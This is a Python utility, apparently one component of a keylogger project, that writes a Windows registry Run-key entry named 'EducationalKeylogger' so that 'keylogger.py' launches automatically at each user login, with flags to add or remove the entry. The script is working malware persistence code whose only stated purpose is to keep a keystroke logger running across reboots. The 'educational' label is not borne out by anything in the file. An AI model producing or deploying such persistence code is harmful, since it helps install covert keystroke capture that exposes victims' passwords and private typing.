import os
import sys
import winreg
import argparse
from pathlib import Path

def setup_windows_startup(enable=True):
    """Setup auto-startup in Windows Registry"""
    app_name = "EducationalKeylogger"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Get the absolute path of the script
        script_path = os.path.abspath("keylogger.py")
        python_exe = sys.executable
        startup_command = f'"{python_exe}" "{script_path}"'
        
        # Open the registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )
        
        if enable:
            # Add to startup
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, startup_command)
            print("[+] Added to startup successfully")
        else:
            # Remove from startup
            try:
                winreg.DeleteValue(key, app_name)
                print("[-] Removed from startup successfully")
            except FileNotFoundError:
                print("[!] Application was not in startup")
                
        winreg.CloseKey(key)
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return False
        
    return True

def main():
    parser = argparse.ArgumentParser(description="Startup Configuration Utility")
    parser.add_argument("--enable", action="store_true", help="Enable auto-startup")
    parser.add_argument("--disable", action="store_true", help="Disable auto-startup")
    args = parser.parse_args()
    
    if args.enable and args.disable:
        print("[!] Please specify either --enable or --disable, not both")
        return
        
    if not args.enable and not args.disable:
        print("[!] Please specify either --enable or --disable")
        return
        
    if sys.platform == "win32":
        setup_windows_startup(enable=args.enable)
    else:
        print("[!] Auto-startup configuration is currently only supported on Windows")
        print("[*] For Linux, add to ~/.config/autostart/ or crontab manually")

if __name__ == "__main__":
    main() 